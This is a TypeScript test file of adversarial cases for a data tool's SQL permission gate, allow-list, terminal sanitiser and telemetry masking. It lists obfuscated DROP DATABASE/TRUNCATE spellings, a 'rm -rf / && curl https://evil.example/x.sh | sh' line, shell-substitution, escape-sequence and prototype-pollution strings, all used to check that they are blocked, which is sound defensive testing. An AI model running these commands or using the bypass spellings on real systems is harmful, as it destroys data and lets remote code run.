/**
 * Adversarial coverage for the v0.12.9 release payload (v0.12.8..HEAD): the model-free `tool` CLI and
 * `mcp serve` permission gate (read/write split, the DROP DATABASE / DROP SCHEMA / TRUNCATE hard deny, the
 * allow-list, `--args -` folding, runner argument validation), the workspace-rules classifier and terminal
 * sanitiser, the telemetry opt-out marker, identity cache, endpoint masking and string masking, sign-out
 * removing the cached telemetry identity, analyst's post-config write denies, and `Filesystem.realLocation`.
 *
 * Targets the exported helpers with hostile inputs: comment-split and dollar-quoted SQL, chained
 * statements, keywords hidden inside literals, prototype-pollution keys, control and bidi characters,
 * link loops, dangling links and ~1 MB inputs. No module mocks, no network; every file write goes to a
 * temp directory under os.tmpdir() (HOME is redirected with OPENCODE_TEST_HOME) that is removed afterwards.
 */
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test"
import fs from "node:fs"
import fsp from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { Cause, Effect, Exit } from "effect"

import { askFor, denied, isBlockedStatement, READ_PERMISSIONS } from "../../src/altimate/tool-cli/permissions"
import { EXPOSED, MCP_OPEN_WRITE_TOOLS, WRITE_TOOLS } from "../../src/altimate/tool-cli/allow-list"
import { foldStdinArgs } from "../../src/altimate/tool-cli/argv"
import { createRunner, type Runner } from "../../src/altimate/tool-cli/runner"
import {
  classify,
  classifyAndCheck,
  classifyMulti,
  isScratchSafeWrite,
  isSingleQuery,
} from "../../src/altimate/tools/sql-classify"
import { classify as classifyRule, memoryScope } from "../../src/altimate/rules/classify"
import { printable } from "../../src/altimate/rules/printable"
import { OptOutMarker } from "../../src/altimate/telemetry/opt-out"
import { TelemetryIdentity } from "../../src/altimate/telemetry/identity"
import { Telemetry } from "../../src/altimate/telemetry"
import { endpointOf } from "../../src/altimate/workspace/api-client"
import { AltimateApi } from "../../src/altimate/api/client"
import { Filesystem } from "../../src/util/filesystem"
import { Agent } from "../../src/agent/agent"
import { Permission } from "../../src/permission"
import { bootstrap } from "../../src/cli/bootstrap"
import { registerDefaultNativeHandlers } from "../lib/native-handlers"
import { testEffect } from "../lib/effect"

const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "release-v0129-adv-"))
afterAll(() => fs.rmSync(tmpRoot, { recursive: true, force: true }))

const HARD_DENY = "DROP DATABASE, DROP SCHEMA and TRUNCATE are blocked for safety"

// ---------------------------------------------------------------------------------------------------------
// 1. #1609 — SQL classifier and the `tool` CLI permission gate
// ---------------------------------------------------------------------------------------------------------

describe("v0.12.9 adversarial: hard-denied statements are blocked however they are spelled", () => {
  test.each([
    ["DROP DATABASE prod", undefined],
    ["drop database prod", undefined],
    ["DrOp ScHeMa s", undefined],
    ["DROP/**/DATABASE prod", undefined],
    ["DROP -- hidden\nDATABASE prod", undefined],
    ["DROP--\nSCHEMA x", undefined],
    ["drop\ndatabase x", undefined],
    ["drop\tschema x", undefined],
    ["DROP DATABASE x", undefined],
    ["DROP DATABASE IF EXISTS x", undefined],
    ["DROP SCHEMA IF EXISTS s CASCADE", "postgres"],
    ["TRUNCATE t", undefined],
    ["truncate table t", undefined],
    ["TRUNCATE/**/t", undefined],
    ["TRUNCATE (t)", undefined],
    ["/* a */ /* b */ TRUNCATE t", undefined],
    ["drop database `x`", "mysql"],
    ["DROP DATABASE [x]", "sqlserver"],
    ["drop schema s", "bigquery"],
    ["drop database x", "snowflake"],
  ] as const)("%p (%p) is blocked", (sql, dialect) => {
    const result = classifyAndCheck(sql, dialect)
    expect(result.blocked).toBe(true)
    expect(result.queryType).toBe("write")
    expect(isBlockedStatement(sql, dialect)).toBe(true)
  })

  test.each([
    ["select 1; drop database prod", undefined],
    ["select 1;drop schema s cascade", undefined],
    ["select 'it''s'; drop schema s", undefined],
    ["select * from t where x = 'a' ; drop database prod -- '", undefined],
    ["select * from t; truncate t", "snowflake"],
    ["select $$x$$; drop database prod", "postgres"],
    ["select 1 #\n drop database x", "mysql"],
  ] as const)("a hard deny chained after a read is still blocked: %p", (sql, dialect) => {
    expect(classifyAndCheck(sql, dialect).blocked).toBe(true)
    expect(classify(sql, dialect)).toBe("write")
    expect(classifyMulti(sql, dialect)).toBe("write")
  })

  test.each([
    ["DO $$ BEGIN EXECUTE 'DROP DATABASE x'; END $$", "postgres"],
    ["EXECUTE IMMEDIATE 'DROP DATABASE x'", "snowflake"],
    ["EXECUTE IMMEDIATE $$DROP DATABASE x$$", "snowflake"],
    ["EXEC('DROP DATABASE x')", "sqlserver"],
    ["select * from query('drop database x')", "duckdb"],
  ] as const)("dynamic SQL that carries a hard deny is blocked: %p", (sql, dialect) => {
    expect(classifyAndCheck(sql, dialect).blocked).toBe(true)
  })

  test("a MySQL executable comment is never read as an inert comment", () => {
    for (const sql of ["DROP /*!50000 DATABASE */ x", "/*!DROP DATABASE x*/", "select 1 /*!; DROP DATABASE x */"]) {
      const result = classifyAndCheck(sql, "mysql")
      expect(result.blocked, sql).toBe(true)
      expect(result.queryType, sql).toBe("write")
    }
  })

  test("a backslash does not escape a quote in a standard-conforming string, so the chained DROP is seen", () => {
    // In Postgres 'a\' is a complete literal: the DROP after it executes.
    expect(classifyAndCheck("select 'a\\'; drop database x; -- '", "postgres").blocked).toBe(true)
    expect(classifyAndCheck("select 'a\\'; drop database x; -- '", "mysql").blocked).toBe(true)
  })

  test("unterminated quotes or comments fail closed as writes", () => {
    const quote = classifyAndCheck("select 'unterminated")
    expect(quote.queryType).toBe("write")
    expect(quote.parseError).toBeString()
    const comment = classifyAndCheck("/* open comment drop database x")
    expect(comment.queryType).toBe("write")
    expect(comment.blocked).toBe(true)
  })

  test("control and line-separator characters between statements do not hide a DROP", () => {
    for (const sql of ["SELECT 1; DROP DATABASE x", "select 1;\u0000drop database x"]) {
      const result = classifyAndCheck(sql)
      expect(result.blocked, JSON.stringify(sql)).toBe(true)
      expect(result.queryType).toBe("write")
    }
  })
})

describe("v0.12.9 adversarial: hard-deny keywords inside literals, comments and identifiers are not refused", () => {
  test.each([
    ["select 'drop database prod'", undefined],
    ["select 1 -- drop database prod", undefined],
    ["select 1 /* truncate t */", undefined],
    ['select "drop database" from t', undefined],
    ["select drop_database from t", undefined],
    ["select database from drop_t", undefined],
    ["select $$drop database x$$", "postgres"],
    ["select $tag$ drop database x $tag$", "postgres"],
    ["select $a$ x $b$; drop database x; $a$", "postgres"],
    ["select E'\\'; drop database x; --'", "postgres"],
    ["select trunc(1.5)", undefined],
  ] as const)("%p (%p) is a read and not blocked", (sql, dialect) => {
    const result = classifyAndCheck(sql, dialect)
    expect(result.blocked).toBe(false)
    expect(result.queryType).toBe("read")
    expect(isBlockedStatement(sql, dialect)).toBe(false)
  })

  test("ordinary writes are writes but are not hard-denied", () => {
    for (const sql of [
      "DROP TABLE t",
      "drop table database_x",
      "DELETE FROM t",
      "INSERT INTO t VALUES (1)",
      "CREATE TABLE t(a int)",
      "ALTER DATABASE x RENAME TO y",
      "SET x = 1",
    ]) {
      const result = classifyAndCheck(sql)
      expect(result.queryType, sql).toBe("write")
      expect(result.blocked, sql).toBe(false)
    }
    for (const sql of ["ATTACH 'x.db'", "COPY t TO 'f.csv'"]) {
      expect(classifyAndCheck(sql, "duckdb")).toMatchObject({ queryType: "write", blocked: false })
    }
  })

  test("plain reads classify as reads", () => {
    for (const sql of ["select * from t", "with x as (select 1) select * from x", "explain select 1", "show tables"])
      expect(classify(sql), sql).toBe("read")
  })
})

describe("v0.12.9 adversarial: classifier degenerate input", () => {
  test("empty and whitespace-only SQL is an unblocked read (nothing executes)", () => {
    for (const sql of ["", "   \n\t "]) expect(classifyAndCheck(sql)).toEqual({ queryType: "read", blocked: false })
  })

  test("non-string input does not throw and is not blocked", () => {
    for (const value of [undefined, null, 42, {}, []]) {
      const result = classifyAndCheck(value as unknown as string)
      expect(result.blocked).toBe(false)
    }
  })

  test("a lone semicolon fails closed as a write", () => {
    expect(classifyAndCheck(";").queryType).toBe("write")
  })

  test("isSingleQuery accepts exactly one query", () => {
    expect(isSingleQuery("select 1")).toBe(true)
    expect(isSingleQuery("select 'a;b'")).toBe(true)
    expect(isSingleQuery("select 1; select 2")).toBe(false)
    expect(isSingleQuery("")).toBe(false)
    expect(isSingleQuery("insert into t values(1)")).toBe(false)
  })

  test("isScratchSafeWrite admits local table DDL/DML only", () => {
    for (const sql of ["CREATE TABLE t(a int)", "insert into t values(1)", "drop table t", "create table main.t(a int)"])
      expect(isScratchSafeWrite(sql), sql).toBe(true)
    for (const sql of [
      "drop table a, b",
      "attach 'x'",
      "copy t to 'x'",
      "select 1",
      "",
      "create table other.t(a int)",
      "drop database x",
      "update t set a=1; select 1",
    ])
      expect(isScratchSafeWrite(sql), sql).toBe(false)
  })

  test("~1 MB of SQL classifies in bounded time, and a DROP after a huge comment is still found", () => {
    const longList = "select " + "a, ".repeat(330_000) + "1"
    const hugeComment = "select 1 /*" + "x".repeat(1_000_000) + "*/; drop database x"
    const hugeLiteral = "select '" + "drop database x ".repeat(65_000) + "'"
    const started = performance.now()
    expect(classifyAndCheck(longList)).toMatchObject({ queryType: "read", blocked: false })
    expect(classifyAndCheck(hugeComment)).toMatchObject({ queryType: "write", blocked: true })
    expect(classifyAndCheck(hugeLiteral)).toMatchObject({ queryType: "read", blocked: false })
    expect(performance.now() - started).toBeLessThan(15_000)
  })
})

describe("v0.12.9 adversarial: askFor (the CLI's permission handler)", () => {
  const ask = (allowWrite: boolean, input: { permission: string; patterns?: string[]; metadata?: unknown }) =>
    Effect.runSyncExit(askFor(allowWrite)({ always: [], ...input } as never))
  const message = (exit: Exit.Exit<unknown, unknown>) =>
    Exit.isFailure(exit) ? String((Cause.squash(exit.cause) as Error)?.message) : "ok"

  test("writes are refused without allowWrite and pass with it", () => {
    const input = { permission: "sql_execute_write", patterns: ["insert into t values(1)"], metadata: {} }
    expect(message(ask(false, input))).toBe(
      "Permission denied: sql_execute_write. Re-run with --allow-write to enable writes.",
    )
    expect(Exit.isSuccess(ask(true, input))).toBe(true)
  })

  test.each(["DROP DATABASE prod", "DROP/**/DATABASE prod", "select 1; truncate t", "drop schema s"])(
    "%p is refused even with allowWrite",
    (sql) => {
      const exit = ask(true, { permission: "sql_execute_write", patterns: [sql], metadata: {} })
      expect(message(exit)).toContain(HARD_DENY)
      expect(message(exit)).toContain("This cannot be overridden")
    },
  )

  test("a read permission whose pattern is a hard deny is still refused", () => {
    expect(message(ask(false, { permission: "sql_execute", patterns: ["drop database x"], metadata: {} }))).toContain(
      HARD_DENY,
    )
  })

  test("one blocked pattern among several reads refuses the call", () => {
    const exit = ask(true, { permission: "sql_execute", patterns: ["select 1", "select 2", "truncate t"], metadata: {} })
    expect(message(exit)).toContain(HARD_DENY)
  })

  test("only a literal boolean hardDenyChecked skips the pattern check", () => {
    const patterns = ["drop database x"]
    for (const flag of ["true", 1, {}, [true]]) {
      expect(message(ask(true, { permission: "sql_execute_write", patterns, metadata: { hardDenyChecked: flag } }))).toContain(
        HARD_DENY,
      )
    }
  })

  test("a non-string or unknown warehouse in metadata does not lift the hard deny", () => {
    for (const warehouse of [{ toString: () => "x" }, "nonexistent-warehouse", 42, ""]) {
      const exit = ask(false, { permission: "sql_execute", patterns: ["drop database x"], metadata: { warehouse } })
      expect(Exit.isFailure(exit)).toBe(true)
    }
  })

  test("reads pass with missing patterns or metadata", () => {
    expect(Exit.isSuccess(ask(false, { permission: "sql_execute" }))).toBe(true)
    expect(Exit.isSuccess(ask(false, { permission: "schema_inspect", patterns: [], metadata: undefined }))).toBe(true)
  })

  test("permission names are matched exactly: prototype keys and case variants are writes", () => {
    for (const permission of ["__proto__", "constructor", "toString", "hasOwnProperty", "SQL_EXECUTE", "sql_execute "]) {
      expect(message(ask(false, { permission, patterns: [], metadata: {} })), permission).toContain("Permission denied")
    }
  })

  test("READ_PERMISSIONS is exactly the four read kinds", () => {
    expect([...READ_PERMISSIONS].sort()).toEqual(["answer_commit", "schema_inspect", "sql_execute", "sql_execute_read"])
    expect(READ_PERMISSIONS.has("sql_execute_write")).toBe(false)
  })

  test("denied() names the permission and the retry verb", () => {
    expect(denied("warehouse_remove").message).toBe(
      "Permission denied: warehouse_remove. Re-run with --allow-write to enable writes.",
    )
    expect(denied("x", "Call again").message).toBe("Permission denied: x. Call again with --allow-write to enable writes.")
  })
})

describe("v0.12.9 adversarial: tool allow-list", () => {
  test("prototype keys are not exposed tools", () => {
    for (const name of ["__proto__", "constructor", "toString", "hasOwnProperty", "valueOf"])
      expect(Object.hasOwn(EXPOSED, name), name).toBe(false)
  })

  test("coding, shell, memory and model-backed tools are not exposed", () => {
    for (const name of [
      "bash",
      "read",
      "edit",
      "write",
      "apply_patch",
      "task",
      "batch",
      "dbt_pr_review",
      "altimate_memory_write",
      "datamate_manager",
      "mcp_discover",
      "feedback_submit",
      "sample_setup",
      "tool_lookup",
    ])
      expect(Object.hasOwn(EXPOSED, name), name).toBe(false)
  })

  test("every write tool is exposed, and every MCP-open write tool is a write tool", () => {
    for (const name of WRITE_TOOLS) expect(Object.hasOwn(EXPOSED, name), name).toBe(true)
    for (const name of MCP_OPEN_WRITE_TOOLS) expect(WRITE_TOOLS.has(name), name).toBe(true)
    expect(MCP_OPEN_WRITE_TOOLS.has("warehouse_remove")).toBe(false)
    expect(MCP_OPEN_WRITE_TOOLS.has("warehouse_install_driver")).toBe(false)
  })
})

describe("v0.12.9 adversarial: foldStdinArgs", () => {
  test("folds `--args -` into `--args=-`", () => {
    expect(foldStdinArgs(["tool", "run", "x", "--args", "-"])).toEqual(["tool", "run", "x", "--args=-"])
  })

  test("a lone `-` not after --args is kept", () => {
    expect(foldStdinArgs(["run", "-", "--args", "{}"])).toEqual(["run", "-", "--args", "{}"])
    expect(foldStdinArgs(["-"])).toEqual(["-"])
  })

  test("--args at the end or followed by a value is untouched", () => {
    expect(foldStdinArgs(["--args"])).toEqual(["--args"])
    expect(foldStdinArgs(["--args", "--"])).toEqual(["--args", "--"])
    expect(foldStdinArgs(["--args", '{"a":"-"}'])).toEqual(["--args", '{"a":"-"}'])
  })

  test("an empty argv stays empty and repeated folds are independent", () => {
    expect(foldStdinArgs([])).toEqual([])
    expect(foldStdinArgs(["--args", "-", "--args", "-"])).toEqual(["--args=-", "--args=-"])
  })
})

describe("v0.12.9 adversarial: runner argument validation and the hard deny end to end", () => {
  let dir: string
  let runner: Runner
  let done: () => void
  let booted: Promise<unknown>

  beforeAll(async () => {
    registerDefaultNativeHandlers()
    dir = await fsp.mkdtemp(path.join(tmpRoot, "runner-"))
    const finished = new Promise<void>((resolve) => (done = resolve))
    await new Promise<void>((resolve, reject) => {
      booted = bootstrap(dir, async () => {
        runner = await createRunner()
        resolve()
        await finished
        await runner.close()
      })
      booted.catch(reject)
    })
  })

  afterAll(async () => {
    done()
    await booted.catch(() => {})
  })

  test.each([[null], [[]], ["select 1"], [42], [true], [undefined]])("non-object args %p are refused", async (args) => {
    const result = await runner.run("sql_format", args)
    expect(result.status).toBe("error")
    expect(result.title).toBe("Invalid arguments")
    expect(result.output).toBe("Tool arguments must be a JSON object.")
  })

  test.each(["__proto__", "constructor", "toString", "hasOwnProperty", "", "SQL_FORMAT"])(
    "tool name %p is unknown",
    async (name) => {
      const result = await runner.run(name, {})
      expect(result.status).toBe("error")
      expect(result.output).toContain(`Unknown tool: ${name}.`)
    },
  )

  test("prototype-pollution keys in args do not pollute Object.prototype", async () => {
    const args = JSON.parse('{"sql":"select 1","__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted2":1}}}')
    await runner.run("sql_format", args)
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
    expect(({} as Record<string, unknown>).polluted2).toBeUndefined()
  })

  test.each(["DROP/**/DATABASE prod", "select 1; drop schema s", "select $$x$$; drop database prod"])(
    "sql_execute %p stays blocked with allowWrite",
    async (query) => {
      const result = await runner.run("sql_execute", { query }, { allowWrite: true })
      expect(result.status).toBe("error")
      expect(result.output).toContain("blocked for safety")
    },
  )

  test("a write without allowWrite is refused with the retry hint", async () => {
    const result = await runner.run("sql_execute", { query: "INSERT INTO t VALUES (1)" })
    expect(result.status).toBe("error")
    expect(result.output).toBe("Permission denied: sql_execute_write. Re-run with --allow-write to enable writes.")
  })

  test("a read that quotes 'drop database' is not refused by the permission gate", async () => {
    const result = await runner.run("sql_execute", { query: "select 'drop database prod'" })
    expect(result.output).not.toContain("Permission denied")
    expect(result.output).not.toContain("blocked for safety")
  })
})

// ---------------------------------------------------------------------------------------------------------
// 2. #1605 — workspace rules: classifier and terminal sanitiser
// ---------------------------------------------------------------------------------------------------------

describe("v0.12.9 adversarial: rule classify", () => {
  test("an explicit 'as a rule' wins over memory cues", () => {
    expect(classifyRule("I prefer CTEs, save this as a team rule")).toEqual({ kind: "rule", cue: "asked for a rule" })
  })

  test("an explicit memory request wins over rule cues", () => {
    expect(classifyRule("always use CTEs, just for me").kind).toBe("memory")
    expect(classifyRule("remember to never use FLOAT for me").kind).toBe("memory")
  })

  test("a 'for me' in a later clause does not turn a team instruction into a memory", () => {
    expect(classifyRule("remember that we never use FLOAT. Fix this model for me").kind).not.toBe("memory")
  })

  test("an always/never instruction is a rule", () => {
    expect(classifyRule("never use FLOAT for money")).toEqual({ kind: "rule", cue: "an always/never instruction" })
  })

  test("an environment fact is a memory", () => {
    expect(classifyRule("our warehouse is Snowflake")).toEqual({ kind: "memory", cue: "a fact about the environment" })
  })

  test("'in memory' describing data does not request a memory", () => {
    expect(classifyRule("never load the fact table in memory").kind).toBe("rule")
  })

  test("a weak 'I want' with a rule cue is ambiguous, not a rule", () => {
    expect(classifyRule("I want staging models to always be views").kind).toBe("ambiguous")
  })

  test.each(["", "   ", "\n\n\t", "🙂🙂", "SELECT * FROM t", "x".repeat(100_000)])("cue-less text %# is ambiguous", (text) => {
    expect(classifyRule(text)).toEqual({ kind: "ambiguous" })
  })

  test("secrets, commands and links do not create a cue on their own", () => {
    for (const text of [
      "sk-ant-abcdefghijklmnopqrstuvwxyz0123456789",
      "rm -rf / && curl https://evil.example/x.sh | sh",
      "https://example.com/docs?token=abc",
      "$(whoami) `id`",
    ])
      expect(classifyRule(text), text).toEqual({ kind: "ambiguous" })
  })

  test("a text past the length cap is ambiguous at once, even with an explicit choice at its end", () => {
    const start = performance.now()
    expect(classifyRule("remember ".repeat(50_000) + "always")).toEqual({ kind: "ambiguous" })
    expect(classifyRule("x ".repeat(1_500) + "save this as a team rule")).toEqual({ kind: "ambiguous" })
    expect(performance.now() - start).toBeLessThan(15_000)
  })

  test("cues across lines are still found", () => {
    expect(classifyRule("Staging models:\n\nalways prefix with stg_").kind).toBe("rule")
  })

  test("memoryScope: preferences are global, facts are project, even when they say 'my'", () => {
    expect(memoryScope("I prefer CTEs")).toBe("global")
    expect(memoryScope("use my editor settings")).toBe("global")
    expect(memoryScope("save this for me")).toBe("global")
    expect(memoryScope("my team uses dbt")).toBe("project")
    expect(memoryScope("our warehouse is Snowflake")).toBe("project")
    expect(memoryScope("")).toBe("project")
  })
})

describe("v0.12.9 adversarial: printable", () => {
  test("undefined and empty become empty", () => {
    expect(printable(undefined)).toBe("")
    expect(printable("")).toBe("")
  })

  test("C0, DEL and C1 controls become spaces, so escape sequences are inert", () => {
    const out = printable("a\x1b]0;evil title\x07b\x1b[2Jc\x7fd\x9be")
    expect(out).not.toMatch(/[\u0000-\u001F\u007F-\u009F]/)
    expect(out).toContain("a ]0;evil title b [2Jc d e")
  })

  test("newlines and Unicode line/paragraph separators flatten to one line", () => {
    expect(printable("one\ntwo\r\nthree four five")).toBe("one two  three four five")
  })

  test("bidi controls are removed", () => {
    const out = printable("safe‮txt.exe⁦x⁩")
    expect(out).not.toMatch(/[‪-‮⁦-⁩]/)
    expect(out.startsWith("safe")).toBe(true)
  })

  test("ordinary unicode and emoji pass through unchanged", () => {
    expect(printable("naïve 名前 🙂 — ok")).toBe("naïve 名前 🙂 — ok")
  })
})

// ---------------------------------------------------------------------------------------------------------
// 3. #1501 / #1513 — telemetry: opt-out marker, identity cache, endpoint masking, maskString
// ---------------------------------------------------------------------------------------------------------

describe("v0.12.9 adversarial: telemetry opt-out marker and identity cache", () => {
  const originalHome = process.env.OPENCODE_TEST_HOME
  let home: string

  beforeEach(() => {
    home = fs.mkdtempSync(path.join(tmpRoot, "home-"))
    process.env.OPENCODE_TEST_HOME = home
  })

  afterEach(() => {
    if (originalHome === undefined) delete process.env.OPENCODE_TEST_HOME
    else process.env.OPENCODE_TEST_HOME = originalHome
  })

  test("paths resolve under the redirected home", () => {
    expect(OptOutMarker.markerPath()).toBe(path.join(home, ".altimate", "telemetry-opted-out"))
    expect(TelemetryIdentity.cachePath()).toBe(path.join(home, ".altimate", "telemetry-identity.json"))
  })

  test("write creates the marker once; a second write fails instead of overwriting", () => {
    expect(OptOutMarker.exists()).toBe(false)
    OptOutMarker.write()
    expect(OptOutMarker.exists()).toBe(true)
    expect(Number.isNaN(Date.parse(fs.readFileSync(OptOutMarker.markerPath(), "utf8").trim()))).toBe(false)
    expect(() => OptOutMarker.write()).toThrow()
  })

  test.skipIf(process.platform === "win32")("write never follows a planted symlink", () => {
    const victim = path.join(home, "victim.txt")
    fs.writeFileSync(victim, "untouched")
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    fs.symlinkSync(victim, OptOutMarker.markerPath())
    expect(() => OptOutMarker.write()).toThrow()
    expect(fs.readFileSync(victim, "utf8")).toBe("untouched")
  })

  test("claim is exclusive: a fresh claim blocks a second one until released", () => {
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    const token = OptOutMarker.claim()
    expect(token).toBeString()
    expect(OptOutMarker.holds(token!)).toBe(true)
    expect(OptOutMarker.claim()).toBeUndefined()
    OptOutMarker.release(token!)
    expect(OptOutMarker.holds(token!)).toBe(false)
    const next = OptOutMarker.claim()
    expect(next).toBeString()
    expect(next).not.toBe(token)
  })

  test("a stale claim is taken over", () => {
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    const old = OptOutMarker.claim()!
    const claimFile = path.join(home, ".altimate", "telemetry-opted-out.sending")
    const past = new Date(Date.now() - 60_000)
    fs.utimesSync(claimFile, past, past)
    const fresh = OptOutMarker.claim()
    expect(fresh).toBeString()
    expect(OptOutMarker.holds(old)).toBe(false)
    expect(OptOutMarker.holds(fresh!)).toBe(true)
  })

  test("claim without the .altimate directory returns undefined instead of throwing", () => {
    expect(OptOutMarker.claim()).toBeUndefined()
  })

  test("holds and release reject foreign, empty and prefix tokens", () => {
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    const token = OptOutMarker.claim()!
    for (const other of ["", " ", token.slice(0, -1), `${token}x`, "__proto__"]) {
      expect(OptOutMarker.holds(other), other).toBe(false)
      OptOutMarker.release(other)
      expect(OptOutMarker.holds(token)).toBe(true)
    }
  })

  test("holds does not trim the caller's token", () => {
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    const token = OptOutMarker.claim()!
    expect(OptOutMarker.holds(` ${token}`)).toBe(false)
  })

  test("clear removes the marker and an in-flight claim, and is a no-op when both are absent", () => {
    expect(() => OptOutMarker.clear()).not.toThrow()
    OptOutMarker.write()
    const token = OptOutMarker.claim()!
    OptOutMarker.clear()
    expect(OptOutMarker.exists()).toBe(false)
    expect(OptOutMarker.holds(token)).toBe(false)
  })

  test("readMachineId ignores a non-UUID or oversized file", () => {
    fs.mkdirSync(path.join(home, ".altimate"), { recursive: true })
    const idFile = path.join(home, ".altimate", "machine-id")
    expect(OptOutMarker.readMachineId()).toBeUndefined()
    fs.writeFileSync(idFile, "not-a-uuid")
    expect(OptOutMarker.readMachineId()).toBeUndefined()
    fs.writeFileSync(idFile, "a".repeat(10_000))
    expect(OptOutMarker.readMachineId()).toBeUndefined()
    const uuid = "123e4567-e89b-42d3-a456-426614174000"
    fs.writeFileSync(idFile, `${uuid}\n`)
    expect(OptOutMarker.readMachineId()).toBe(uuid)
  })

  test("identity clear is a no-op when the cache is absent and removes it when present", async () => {
    await expect(TelemetryIdentity.clear()).resolves.toBeUndefined()
    fs.mkdirSync(path.dirname(TelemetryIdentity.cachePath()), { recursive: true })
    fs.writeFileSync(TelemetryIdentity.cachePath(), "{}")
    await TelemetryIdentity.clear()
    expect(fs.existsSync(TelemetryIdentity.cachePath())).toBe(false)
  })
})

describe("v0.12.9 adversarial: endpointOf masks identifiers from workspace_api_error", () => {
  test("listed routes keep their label and drop the identifier", () => {
    expect(endpointOf("GET", "/datamates/memory", "/42")).toBe("GET /datamates/memory/:id")
    expect(endpointOf("POST", "/datamate-project-bindings", "/bind")).toBe("POST /datamate-project-bindings/bind")
  })

  test("an identifier spelled like a route word is still masked", () => {
    expect(endpointOf("GET", "/datamates/memory", "/list?x=1")).toBe("GET /datamates/memory/list")
    expect(endpointOf("GET", "/datamate-project-bindings", "/bind/extra")).toBe(
      "GET /datamate-project-bindings/:id/:id",
    )
  })

  test("query strings never reach the label", () => {
    const out = endpointOf("GET", "/datamate-project-bindings", "/by-remote?remote=git@github.com:acme/secret.git")
    expect(out).toBe("GET /datamate-project-bindings/by-remote")
  })

  test("an unlisted router has every segment masked, including emails and paths", () => {
    const out = endpointOf("DELETE", "/secret-router/alice@example.com", "/Users/alice/x.sql")
    expect(out).toBe("DELETE /:id/:id/:id/:id/:id")
    expect(out).not.toContain("alice")
  })

  test("a slash-prefixed prototype key as a base path is treated as unlisted", () => {
    expect(endpointOf("GET", "/__proto__", "/x")).toBe("GET /:id/:id")
    expect(endpointOf("GET", "/constructor", "/toString")).toBe("GET /:id/:id")
  })

  test("empty inputs produce a well-formed label", () => {
    expect(endpointOf("GET", "", "")).toBe("GET ")
    expect(endpointOf("GET", "/datamates", "")).toBe("GET /datamates/")
  })
})

describe("v0.12.9 adversarial: Telemetry.maskString", () => {
  test("home paths and emails are masked", () => {
    const out = Telemetry.maskString("user bob@example.com failed to open /Users/alice/project/model.sql")
    expect(out).not.toContain("alice")
    expect(out).not.toContain("bob@example.com")
    expect(out).toContain("<path>")
    expect(out).toContain("<email>")
    // A path consumes trailing words rather than leak them: an email after it goes with it.
    expect(Telemetry.maskString("open /Users/alice/x for bob@example.com")).not.toContain("bob")
  })

  test("SQL string literals collapse, so values in them do not leak", () => {
    const out = Telemetry.maskString("select * from users where email = 'carol@example.com' and ssn = '123-45-6789'")
    expect(out).not.toContain("carol")
    expect(out).not.toContain("123-45-6789")
  })

  test("API keys and bearer tokens are redacted", () => {
    const out = Telemetry.maskString("key sk-ant-abcdefghijklmnopqrstuvwxyz012345 Bearer abcdefghijklmnopqrstuvwxyz0123")
    expect(out).toContain("sk-***")
    expect(out).toContain("Bearer ***")
    expect(out).not.toContain("abcdefghijklmnopqrstuvwxyz")
  })

  test("internal hosts with basic-auth userinfo are masked whole", () => {
    const out = Telemetry.maskString("connect https://admin:hunter2@10.0.0.5:8443/x failed")
    expect(out).not.toContain("hunter2")
    expect(out).toContain("<internal-host>")
  })

  test("ANSI sequences do not split a secret past the redaction", () => {
    expect(Telemetry.maskString("\x1b[31msk-abcdefghijklmnopqrstuvwxyz\x1b[0m")).toBe("sk-***")
  })

  test("a ~1 MB input is masked in bounded time and output", () => {
    const big = ("/Users/dave/" + "a".repeat(200) + " ").repeat(5_000)
    const started = performance.now()
    const out = Telemetry.maskString(big)
    expect(performance.now() - started).toBeLessThan(2_000)
    expect(out.length).toBeLessThan(10_000)
    expect(out).not.toContain("dave")
  })

  test("empty and whitespace input masks to empty", () => {
    expect(Telemetry.maskString("")).toBe("")
    expect(Telemetry.maskString(" \n\t ")).toBe("")
  })
})

// ---------------------------------------------------------------------------------------------------------
// 4. #1606 + this release — sign-out forgets the cached telemetry identity
// ---------------------------------------------------------------------------------------------------------

describe("v0.12.9 adversarial: AltimateApi.signOut removes the telemetry identity cache", () => {
  const originalHome = process.env.OPENCODE_TEST_HOME
  let root: string
  let home: string
  let repo: string

  const writeJson = async (file: string, value: unknown) => {
    await fsp.mkdir(path.dirname(file), { recursive: true })
    await fsp.writeFile(file, JSON.stringify(value))
  }
  const plantIdentity = () =>
    writeJson(TelemetryIdentity.cachePath(), {
      user_id: "123e4567-e89b-42d3-a456-426614174000",
      tenant: "tenant",
      fingerprint: "f",
    })

  beforeEach(async () => {
    root = await fsp.mkdtemp(path.join(tmpRoot, "signout-"))
    home = path.join(root, "home")
    repo = path.join(root, "repo")
    process.env.OPENCODE_TEST_HOME = home
    await fsp.mkdir(path.join(repo, ".git"), { recursive: true })
  })

  afterEach(async () => {
    if (originalHome === undefined) delete process.env.OPENCODE_TEST_HOME
    else process.env.OPENCODE_TEST_HOME = originalHome
    await fsp.rm(root, { recursive: true, force: true })
  })

  test("configured: removes the credential file and the identity cache", async () => {
    await writeJson(AltimateApi.credentialsPath(), {
      altimateUrl: "https://api.test",
      altimateInstanceName: "tenant",
      altimateApiKey: "gateway-test-key",
    })
    await plantIdentity()

    await AltimateApi.signOut(repo)

    expect(await AltimateApi.isConfigured()).toBe(false)
    expect(fs.existsSync(TelemetryIdentity.cachePath())).toBe(false)
  })

  test("not configured: still removes a leftover identity cache", async () => {
    await plantIdentity()

    expect(await AltimateApi.signOut(repo)).toEqual([])
    expect(fs.existsSync(TelemetryIdentity.cachePath())).toBe(false)
  })

  test("not configured and no cache: resolves to [] without creating anything", async () => {
    expect(await AltimateApi.signOut(repo)).toEqual([])
    expect(fs.existsSync(TelemetryIdentity.cachePath())).toBe(false)
  })

  test("an unreadable key fails the sign-out and keeps the identity cache", async () => {
    delete process.env.RELEASE_V0129_MISSING_KEY
    await writeJson(AltimateApi.credentialsPath(), {
      altimateUrl: "https://api.test",
      altimateInstanceName: "tenant",
      altimateApiKey: "${env:RELEASE_V0129_MISSING_KEY}",
    })
    await plantIdentity()

